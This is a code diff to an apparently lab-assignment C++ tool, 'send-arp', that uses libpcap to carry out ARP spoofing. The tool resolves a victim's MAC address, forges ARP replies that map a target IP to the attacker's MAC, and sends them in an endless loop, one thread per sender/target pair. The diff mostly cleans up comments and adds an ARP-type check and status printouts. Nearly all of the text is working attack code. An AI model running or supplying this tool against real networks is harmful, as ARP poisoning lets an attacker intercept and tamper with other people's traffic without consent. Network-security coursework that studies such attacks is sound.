@@ -33,10 +33,6 @@ void usage() {
 	printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-// syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]
-// sample : send-arp wlan0 192.168.10.2 192.168.10.1
-
-
 uint8_t* get_host_mac(ifreq ifr, ifconf ifc, char* interface_name){
 	// struct ifreq ifr;
     // struct ifconf ifc;
@@ -53,19 +49,6 @@ uint8_t* get_host_mac(ifreq ifr, ifconf ifc, char* interface_name){
     struct ifreq* it = ifc.ifc_req;
     const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
 
-    // for (; it != end; ++it) {
-    //     strcpy(ifr.ifr_name, it->ifr_name);
-    //     if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
-    //         if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
-    //             if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
-    //                 success = 1;
-    //                 break;
-    //             }
-    //         }
-    //     }
-    //     else { /* handle error */ }
-    // }
-
     strcpy(ifr.ifr_name, interface_name);
 	if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
 		if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
@@ -81,18 +64,10 @@ uint8_t* get_host_mac(ifreq ifr, ifconf ifc, char* interface_name){
 
     if (success) memcpy(mac_address, ifr.ifr_hwaddr.sa_data, 6);
 
-	// printf("%s\n", ifr.ifr_name);
-	// printf("%02x %02x %02x %02x %02x %02x\n", mac_address[0],mac_address[1],mac_address[2],mac_address[3],mac_address[4],mac_address[5]);
-
-	// struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
-	// printf("IP address: %s\n",inet_ntoa(ipaddr->sin_addr));	
-
 	return mac_address;
 }
 
 char* get_host_ip(ifreq ifr, char* interface_name){
-	// struct ifreq ifr;
-	// char* interface_name = "ens33";
 	size_t if_name_len=strlen(interface_name);
 	if (if_name_len<sizeof(ifr.ifr_name)) {
 		memcpy(ifr.ifr_name, interface_name, if_name_len);
@@ -114,7 +89,6 @@ char* get_host_ip(ifreq ifr, char* interface_name){
 	close(fd);
 
 	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
-	// printf("IP address: %s\n", inet_ntoa(ipaddr->sin_addr));
 	static char* ip_addr = inet_ntoa(ipaddr->sin_addr);
 
 	return ip_addr;
@@ -122,7 +96,7 @@ char* get_host_ip(ifreq ifr, char* interface_name){
 
 void arp_request(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* attacker_mac){
 	EthArpPacket packet;
-	// printf("start\n");
+
 	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
 	packet.eth_.smac_ = Mac(attacker_mac);
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -140,7 +114,6 @@ void arp_request(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* at
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-	// printf("end\n");
 }
 
 Mac get_sender_mac(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* attacker_mac){
@@ -163,6 +136,10 @@ Mac get_sender_mac(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* 
 		if(rec_mac != attk_mac){
 			continue;
 		}
+
+		if(ethernet->type() != ethernet->Arp){
+			continue;
+		}
 		
 		packet += sizeof(EthHdr);
 		ArpHdr* arp = (ArpHdr*)packet;
@@ -173,8 +150,8 @@ Mac get_sender_mac(pcap_t* handle, char* sender_ip, char* attacker_ip, uint8_t* 
 			continue;
 		}
 
-		printf("수신완료\n");
-		
+		printf("[+]%s => [me] : MAC_ADDR RECEIVED SUCCESS!\n", ((std::string)rec_ip).c_str());
+		printf("[+]RECV: %s\n", ((std::string)ethernet->smac()).c_str());
 		return ethernet->smac();
 	}
 	return 0; // 다른걸로 변경
@@ -209,31 +186,22 @@ void* arp_send_attack(void* thread_argv){
 	EthArpPacket packet;
 	MultiArgv* attack_data = (MultiArgv*)thread_argv;
 
+	printf("[>]THREAD START!\n");
 	arp_request(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
 	Mac sender_mac = get_sender_mac(attack_data->handle, attack_data->sender_ip, attack_data->attacker_ip, attack_data->attacker_mac);
-	printf("%s\n", ((std::string)sender_mac).c_str());
 
 	packet = set_arp_packet(packet, attack_data->sender_ip, sender_mac, attack_data->target_ip, attack_data->attacker_ip, attack_data->attacker_mac);
-
+	printf("[+]%s ATTACK START!\n", attack_data->sender_ip);
 	while(true){
 		send_arp(attack_data->handle, packet);
 	}
 }
-// void arp_send_attack(pcap_t* handle, char* sender_ip, char* target_ip, char* attacker_ip, uint8_t* attacker_mac){
-// 	EthArpPacket packet;
 
-// 	arp_request(handle, sender_ip, attacker_ip, attacker_mac);
-// 	Mac sender_mac = get_sender_mac(handle, sender_ip, attacker_ip, attacker_mac);
-// 	printf("%s\n", ((std::string)sender_mac).c_str());
-
-// 	packet = set_arp_packet(packet, sender_ip, sender_mac, target_ip, attacker_ip, attacker_mac);
-
-// 	while(true){
-// 		send_arp(handle, packet);
-// 	}
-// }
-
-
+void print_info(char* sender_ip, char* target_ip){
+	printf("==========================================================\n");
+	printf("[SENDER] %s -> [TARGET] %s\n", sender_ip, target_ip);
+	printf("==========================================================\n");
+}
 
 int main(int argc, char* argv[]) {
 	if (argc < 4 || (argc) % 2 != 0) {
@@ -262,11 +230,6 @@ int main(int argc, char* argv[]) {
 		char* sender_ip = argv[i];
 		char* target_ip = argv[i + 1];
 
-		printf("+++++++++++++++++\n");
-		printf("sender_ip: %s\n", argv[i]);
-		printf("target_ip: %s\n", argv[i+1]);
-		printf("+++++++++++++++++\n");
-
 		MultiArgv *attack_data = (MultiArgv *)malloc(sizeof(MultiArgv));
 		attack_data->handle = handle;
 		attack_data->sender_ip = sender_ip;
@@ -274,6 +237,8 @@ int main(int argc, char* argv[]) {
 		attack_data->attacker_ip = attacker_ip;
 		attack_data->attacker_mac = attacker_mac;
 
+		
+		print_info(sender_ip, target_ip);
 		pthread_create(&thread[i], NULL, arp_send_attack, (void*)attack_data);
 	}
 	
